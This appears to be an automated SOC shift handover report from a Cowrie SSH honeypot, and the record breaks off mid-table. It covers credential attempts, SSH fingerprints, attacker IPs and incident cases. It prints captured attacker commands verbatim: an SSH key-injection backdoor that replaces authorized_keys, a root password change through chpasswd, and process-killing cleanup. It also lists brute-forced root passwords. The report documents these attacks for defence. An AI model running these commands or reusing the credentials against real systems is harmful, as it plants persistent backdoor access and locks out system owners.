# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-04-15 |
| **Generated At** | 2026-04-15T20:57:01Z |
| **Shift Time** | 20:57 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **63** |
| Confirmed Threats | **59** |
| False Positives Filtered | **4** (6.3%) |
| Unique Attacker IPs | **15** |
| Countries of Origin | **8** |
| High Severity Cases | **9** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **54** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 2 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **31** |
| Unique Credential Pairs | **27** |
| Unique Usernames | **17** |
| Unique Passwords | **26** |
| Successful Auth Pairs | **9** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 9 |
| `alex` | 3 |
| `user` | 3 |
| `ftpuser` | 2 |
| `345gs5662d34` | 2 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `abcd1234` | 3 |
| `345gs5662d34` | 2 |
| `3245gs5662d34` | 2 |
| `asdf@123123` | 2 |
| `gituser` | 1 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 2 |
| `root` | `3245gs5662d34` | 2 |
| `user` | `abcd1234` | 2 |
| `root` | `asdf@123123` | 2 |
| `git` | `gituser` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `!@#123qweASD` | `77.87.40.114` | 2026-04-15T19:34:41 |
| `root` | `3245gs5662d34` | `77.87.40.114` | 2026-04-15T19:34:45 |
| `root` | `------fuck------` | `42.4.62.108` | 2026-04-15T20:04:52 |
| `root` | `asdf@123123` | `180.76.184.79` | 2026-04-15T20:51:52 |
| `root` | `qazwsx12345@#` | `180.76.184.79` | 2026-04-15T20:52:53 |
| `root` | `root888@123` | `223.244.25.6` | 2026-04-15T20:53:21 |
| `root` | `asdf@123123` | `39.117.79.36` | 2026-04-15T20:53:43 |
| `root` | `3245gs5662d34` | `39.117.79.36` | 2026-04-15T20:53:47 |
| `root` | `root2026!@#` | `223.244.25.6` | 2026-04-15T20:55:48 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **63** |
| Sessions with Fingerprint | **4** |
| Unique HASSH Fingerprints | **4** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 54 |
| Go SSH scanner | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `03a80b21afa8...` | Modern SSH client | 40 | 6 |
| `f555226df196...` | Mirai/variant | 6 | 1 |
| `98f63c4d9c87...` | Generic scanner | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `03a80b21afa8...` | libssh | 40 | 6 | Modern SSH client |
| `95420f9d932d...` | libssh | 8 | 2 | — |
| `f555226df196...` | libssh | 6 | 1 | Mirai/variant |
| `98f63c4d9c87...` | Go SSH scanner | 1 | 1 | Generic scanner |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **3** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 3 | 2 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 2 | 2 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:rEJGP58Zregg"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `180.76.184.79`, `223.244.25.6`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `77.87.40.114`, `39.117.79.36`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **15** |
| Unique ASNs | **14** |
| High-Risk ASNs | **11** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS63949` | Akamai Connected Cloud | 2 | HIGH |
| `AS9318` | SK Broadband Co Ltd | 1 | HIGH |
| `AS44668` | Znet | 1 | HIGH |
| `AS23724` | IDC, China Telecommunications Corporation | 1 | HIGH |
| `AS14061` | DigitalOcean, LLC | 1 | HIGH |
| `AS38365` | Beijing Baidu Netcom Science and Technology Co., Ltd. | 1 | HIGH |
| `AS45102` | Alibaba (US) Technology Co., Ltd. | 1 | LOW |
| `AS7602` | Sai gon Postel Corporation | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (9)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-429d1b80a156

| Field | Detail |
|---|---|
| **Source IP** | `77.87.40[.]114` |
| **First Seen** | 2026-04-15 19:34 |
| **Last Seen** | 2026-04-15 19:34 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 19:34:40` | `cowrie.session.connect` |
| `2026-04-15 19:34:40` | `cowrie.client.version` |
| `2026-04-15 19:34:40` | `cowrie.client.kex` |
| `2026-04-15 19:34:41` | `cowrie.login.success` |
| `2026-04-15 19:34:41` | `cowrie.session.params` |
| `2026-04-15 19:34:41` | `cowrie.command.input` |
| `2026-04-15 19:34:41` | `cowrie.command.failed` |
| `2026-04-15 19:34:41` | `cowrie.log.closed` |
| `2026-04-15 19:34:42` | `cowrie.session.params` |
| `2026-04-15 19:34:42` | `cowrie.command.input` |
| `2026-04-15 19:34:42` | `cowrie.session.file_download` |
| `2026-04-15 19:34:42` | `cowrie.log.closed` |
| `2026-04-15 19:34:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.87.40[.]114` to AbuseIPDB if not already reported
- [ ] Block `77.87.40[.]114` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9a17cbf1cbe2

| Field | Detail |
|---|---|
| **Source IP** | `77.87.40[.]114` |
| **First Seen** | 2026-04-15 19:34 |
| **Last Seen** | 2026-04-15 19:34 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 19:34:44` | `cowrie.session.connect` |
| `2026-04-15 19:34:44` | `cowrie.client.version` |
| `2026-04-15 19:34:44` | `cowrie.client.kex` |
| `2026-04-15 19:34:45` | `cowrie.login.success` |
| `2026-04-15 19:34:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.87.40[.]114` to AbuseIPDB if not already reported
- [ ] Block `77.87.40[.]114` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9d1c903d93f3

| Field | Detail |
|---|---|
| **Source IP** | `42.4.62[.]108` |
| **First Seen** | 2026-04-15 20:04 |
| **Last Seen** | 2026-04-15 20:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 20:04:52` | `cowrie.session.connect` |
| `2026-04-15 20:04:52` | `cowrie.client.version` |
| `2026-04-15 20:04:52` | `cowrie.client.kex` |
| `2026-04-15 20:04:52` | `cowrie.login.success` |
| `2026-04-15 20:04:52` | `cowrie.session.params` |
| `2026-04-15 20:04:52` | `cowrie.command.input` |
| `2026-04-15 20:04:53` | `cowrie.log.closed` |
| `2026-04-15 20:04:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `42.4.62[.]108` to AbuseIPDB if not already reported
- [ ] Block `42.4.62[.]108` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d3af144296c4

| Field | Detail |
|---|---|
| **Source IP** | `180.76.184[.]79` |
| **First Seen** | 2026-04-15 20:51 |
| **Last Seen** | 2026-04-15 20:52 |
| **Session Duration** | 35s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:rEJGP58Zregg"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 20:51:49` | `cowrie.session.connect` |
| `2026-04-15 20:51:49` | `cowrie.client.version` |
| `2026-04-15 20:51:51` | `cowrie.client.kex` |
| `2026-04-15 20:51:52` | `cowrie.login.success` |
| `2026-04-15 20:51:53` | `cowrie.session.params` |
| `2026-04-15 20:51:53` | `cowrie.command.input` |
| `2026-04-15 20:51:53` | `cowrie.command.failed` |
| `2026-04-15 20:51:54` | `cowrie.log.closed` |
| `2026-04-15 20:51:54` | `cowrie.session.params` |
| `2026-04-15 20:51:54` | `cowrie.command.input` |
| `2026-04-15 20:51:55` | `cowrie.session.file_download` |
| `2026-04-15 20:51:55` | `cowrie.log.closed` |
| `2026-04-15 20:52:08` | `cowrie.session.params` |
| `2026-04-15 20:52:08` | `cowrie.command.input` |
| `2026-04-15 20:52:08` | `cowrie.log.closed` |
| `2026-04-15 20:52:08` | `cowrie.session.params` |
| `2026-04-15 20:52:08` | `cowrie.command.input` |
| `2026-04-15 20:52:09` | `cowrie.log.closed` |
| `2026-04-15 20:52:10` | `cowrie.session.params` |
| `2026-04-15 20:52:10` | `cowrie.command.input` |
| `2026-04-15 20:52:11` | `cowrie.session.file_download` |
| `2026-04-15 20:52:11` | `cowrie.log.closed` |
| `2026-04-15 20:52:11` | `cowrie.session.params` |
| `2026-04-15 20:52:11` | `cowrie.command.input` |
| `2026-04-15 20:52:11` | `cowrie.log.closed` |
| `2026-04-15 20:52:12` | `cowrie.session.params` |
| `2026-04-15 20:52:12` | `cowrie.command.input` |
| `2026-04-15 20:52:12` | `cowrie.log.closed` |
| `2026-04-15 20:52:12` | `cowrie.session.params` |
| `2026-04-15 20:52:12` | `cowrie.command.input` |
| `2026-04-15 20:52:12` | `cowrie.command.input` |
| `2026-04-15 20:52:13` | `cowrie.log.closed` |
| `2026-04-15 20:52:13` | `cowrie.session.params` |
| `2026-04-15 20:52:13` | `cowrie.command.input` |
| `2026-04-15 20:52:13` | `cowrie.log.closed` |
| `2026-04-15 20:52:14` | `cowrie.session.params` |
| `2026-04-15 20:52:14` | `cowrie.command.input` |
| `2026-04-15 20:52:14` | `cowrie.log.closed` |
| `2026-04-15 20:52:15` | `cowrie.session.params` |
| `2026-04-15 20:52:15` | `cowrie.command.input` |
| `2026-04-15 20:52:15` | `cowrie.log.closed` |
| `2026-04-15 20:52:15` | `cowrie.session.params` |
| `2026-04-15 20:52:15` | `cowrie.command.input` |
| `2026-04-15 20:52:16` | `cowrie.log.closed` |
| `2026-04-15 20:52:17` | `cowrie.session.params` |
| `2026-04-15 20:52:17` | `cowrie.command.input` |
| `2026-04-15 20:52:17` | `cowrie.log.closed` |
| `2026-04-15 20:52:19` | `cowrie.session.params` |
| `2026-04-15 20:52:19` | `cowrie.command.input` |
| `2026-04-15 20:52:20` | `cowrie.log.closed` |
| `2026-04-15 20:52:20` | `cowrie.session.params` |
| `2026-04-15 20:52:20` | `cowrie.command.input` |
| `2026-04-15 20:52:21` | `cowrie.log.closed` |
| `2026-04-15 20:52:22` | `cowrie.session.params` |
| `2026-04-15 20:52:22` | `cowrie.command.input` |
| `2026-04-15 20:52:22` | `cowrie.log.closed` |
| `2026-04-15 20:52:23` | `cowrie.session.params` |
| `2026-04-15 20:52:23` | `cowrie.command.input` |
| `2026-04-15 20:52:23` | `cowrie.log.closed` |
| `2026-04-15 20:52:23` | `cowrie.session.params` |
| `2026-04-15 20:52:23` | `cowrie.command.input` |
| `2026-04-15 20:52:24` | `cowrie.log.closed` |
| `2026-04-15 20:52:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.76.184[.]79` to AbuseIPDB if not already reported
- [ ] Block `180.76.184[.]79` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e557624d18dc

| Field | Detail |
|---|---|
| **Source IP** | `180.76.184[.]79` |
| **First Seen** | 2026-04-15 20:52 |
| **Last Seen** | 2026-04-15 20:53 |
| **Session Duration** | 32s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:UKF9LJjMuKqO"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 20:52:52` | `cowrie.session.connect` |
| `2026-04-15 20:52:52` | `cowrie.client.version` |
| `2026-04-15 20:52:52` | `cowrie.client.kex` |
| `2026-04-15 20:52:53` | `cowrie.login.success` |
| `2026-04-15 20:52:53` | `cowrie.session.params` |
| `2026-04-15 20:52:53` | `cowrie.command.input` |
| `2026-04-15 20:52:53` | `cowrie.command.failed` |
| `2026-04-15 20:52:54` | `cowrie.log.closed` |
| `2026-04-15 20:52:55` | `cowrie.session.params` |
| `2026-04-15 20:52:55` | `cowrie.command.input` |
| `2026-04-15 20:52:55` | `cowrie.session.file_download` |
| `2026-04-15 20:52:55` | `cowrie.log.closed` |
| `2026-04-15 20:53:09` | `cowrie.session.params` |
| `2026-04-15 20:53:09` | `cowrie.command.input` |
| `2026-04-15 20:53:09` | `cowrie.log.closed` |
| `2026-04-15 20:53:10` | `cowrie.session.params` |
| `2026-04-15 20:53:10` | `cowrie.command.input` |
| `2026-04-15 20:53:10` | `cowrie.log.closed` |
| `2026-04-15 20:53:11` | `cowrie.session.params` |
| `2026-04-15 20:53:11` | `cowrie.command.input` |
| `2026-04-15 20:53:12` | `cowrie.session.file_download` |
| `2026-04-15 20:53:12` | `cowrie.log.closed` |
| `2026-04-15 20:53:13` | `cowrie.session.params` |
| `2026-04-15 20:53:13` | `cowrie.command.input` |
| `2026-04-15 20:53:13` | `cowrie.log.closed` |
| `2026-04-15 20:53:13` | `cowrie.session.params` |
| `2026-04-15 20:53:13` | `cowrie.command.input` |
| `2026-04-15 20:53:14` | `cowrie.log.closed` |
| `2026-04-15 20:53:14` | `cowrie.session.params` |
| `2026-04-15 20:53:14` | `cowrie.command.input` |
| `2026-04-15 20:53:14` | `cowrie.command.input` |
| `2026-04-15 20:53:14` | `cowrie.log.closed` |
| `2026-04-15 20:53:15` | `cowrie.session.params` |
| `2026-04-15 20:53:15` | `cowrie.command.input` |
| `2026-04-15 20:53:15` | `cowrie.log.closed` |
| `2026-04-15 20:53:16` | `cowrie.session.params` |
| `2026-04-15 20:53:16` | `cowrie.command.input` |
| `2026-04-15 20:53:16` | `cowrie.log.closed` |
| `2026-04-15 20:53:16` | `cowrie.session.params` |
| `2026-04-15 20:53:16` | `cowrie.command.input` |
| `2026-04-15 20:53:17` | `cowrie.log.closed` |
| `2026-04-15 20:53:17` | `cowrie.session.params` |
| `2026-04-15 20:53:17` | `cowrie.command.input` |
| `2026-04-15 20:53:18` | `cowrie.log.closed` |
| `2026-04-15 20:53:19` | `cowrie.session.params` |
| `2026-04-15 20:53:19` | `cowrie.command.input` |
| `2026-04-15 20:53:19` | `cowrie.log.closed` |
| `2026-04-15 20:53:20` | `cowrie.session.params` |
| `2026-04-15 20:53:20` | `cowrie.command.input` |
| `2026-04-15 20:53:20` | `cowrie.log.closed` |
| `2026-04-15 20:53:21` | `cowrie.session.params` |
| `2026-04-15 20:53:21` | `cowrie.command.input` |
| `2026-04-15 20:53:21` | `cowrie.log.closed` |
| `2026-04-15 20:53:21` | `cowrie.session.params` |
| `2026-04-15 20:53:21` | `cowrie.command.input` |
| `2026-04-15 20:53:22` | `cowrie.log.closed` |
| `2026-04-15 20:53:23` | `cowrie.session.params` |
| `2026-04-15 20:53:23` | `cowrie.command.input` |
| `2026-04-15 20:53:23` | `cowrie.log.closed` |
| `2026-04-15 20:53:24` | `cowrie.session.params` |
| `2026-04-15 20:53:24` | `cowrie.command.input` |
| `2026-04-15 20:53:24` | `cowrie.log.closed` |
| `2026-04-15 20:53:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.76.184[.]79` to AbuseIPDB if not already reported
- [ ] Block `180.76.184[.]79` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b1b37f964a00

| Field | Detail |
|---|---|
| **Source IP** | `223.244.25[.]6` |
| **First Seen** | 2026-04-15 20:53 |
| **Last Seen** | 2026-04-15 20:53 |
| **Session Duration** | 28s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:jjciWcXUrnWA"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 20:53:20` | `cowrie.session.connect` |
| `2026-04-15 20:53:20` | `cowrie.client.version` |
| `2026-04-15 20:53:20` | `cowrie.client.kex` |
| `2026-04-15 20:53:21` | `cowrie.login.success` |
| `2026-04-15 20:53:21` | `cowrie.session.params` |
| `2026-04-15 20:53:21` | `cowrie.command.input` |
| `2026-04-15 20:53:21` | `cowrie.command.failed` |
| `2026-04-15 20:53:21` | `cowrie.log.closed` |
| `2026-04-15 20:53:22` | `cowrie.session.params` |
| `2026-04-15 20:53:22` | `cowrie.command.input` |
| `2026-04-15 20:53:23` | `cowrie.session.file_download` |
| `2026-04-15 20:53:23` | `cowrie.log.closed` |
| `2026-04-15 20:53:35` | `cowrie.session.params` |
| `2026-04-15 20:53:35` | `cowrie.command.input` |
| `2026-04-15 20:53:35` | `cowrie.log.closed` |
| `2026-04-15 20:53:36` | `cowrie.session.params` |
| `2026-04-15 20:53:36` | `cowrie.command.input` |
| `2026-04-15 20:53:36` | `cowrie.log.closed` |
| `2026-04-15 20:53:38` | `cowrie.session.params` |
| `2026-04-15 20:53:38` | `cowrie.command.input` |
| `2026-04-15 20:53:38` | `cowrie.session.file_download` |
| `2026-04-15 20:53:38` | `cowrie.log.closed` |
| `2026-04-15 20:53:39` | `cowrie.session.params` |
| `2026-04-15 20:53:39` | `cowrie.command.input` |
| `2026-04-15 20:53:39` | `cowrie.log.closed` |
| `2026-04-15 20:53:39` | `cowrie.session.params` |
| `2026-04-15 20:53:39` | `cowrie.command.input` |
| `2026-04-15 20:53:39` | `cowrie.log.closed` |
| `2026-04-15 20:53:40` | `cowrie.session.params` |
| `2026-04-15 20:53:40` | `cowrie.command.input` |
| `2026-04-15 20:53:40` | `cowrie.command.input` |
| `2026-04-15 20:53:40` | `cowrie.log.closed` |
| `2026-04-15 20:53:41` | `cowrie.session.params` |
| `2026-04-15 20:53:41` | `cowrie.command.input` |
| `2026-04-15 20:53:41` | `cowrie.log.closed` |
| `2026-04-15 20:53:42` | `cowrie.session.params` |
| `2026-04-15 20:53:42` | `cowrie.command.input` |
| `2026-04-15 20:53:42` | `cowrie.log.closed` |
| `2026-04-15 20:53:43` | `cowrie.session.params` |
| `2026-04-15 20:53:43` | `cowrie.command.input` |
| `2026-04-15 20:53:43` | `cowrie.log.closed` |
| `2026-04-15 20:53:44` | `cowrie.session.params` |
| `2026-04-15 20:53:44` | `cowrie.command.input` |
| `2026-04-15 20:53:44` | `cowrie.log.closed` |
| `2026-04-15 20:53:44` | `cowrie.session.params` |
| `2026-04-15 20:53:44` | `cowrie.command.input` |
| `2026-04-15 20:53:44` | `cowrie.log.closed` |
| `2026-04-15 20:53:45` | `cowrie.session.params` |
| `2026-04-15 20:53:45` | `cowrie.command.input` |
| `2026-04-15 20:53:46` | `cowrie.log.closed` |
| `2026-04-15 20:53:46` | `cowrie.session.params` |
| `2026-04-15 20:53:46` | `cowrie.command.input` |
| `2026-04-15 20:53:46` | `cowrie.log.closed` |
| `2026-04-15 20:53:47` | `cowrie.session.params` |
| `2026-04-15 20:53:47` | `cowrie.command.input` |
| `2026-04-15 20:53:47` | `cowrie.log.closed` |
| `2026-04-15 20:53:48` | `cowrie.session.params` |
| `2026-04-15 20:53:48` | `cowrie.command.input` |
| `2026-04-15 20:53:48` | `cowrie.log.closed` |
| `2026-04-15 20:53:48` | `cowrie.session.params` |
| `2026-04-15 20:53:48` | `cowrie.command.input` |
| `2026-04-15 20:53:49` | `cowrie.log.closed` |
| `2026-04-15 20:53:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `223.244.25[.]6` to AbuseIPDB if not already reported
- [ ] Block `223.244.25[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a77ee9cdaae2

| Field | Detail |
|---|---|
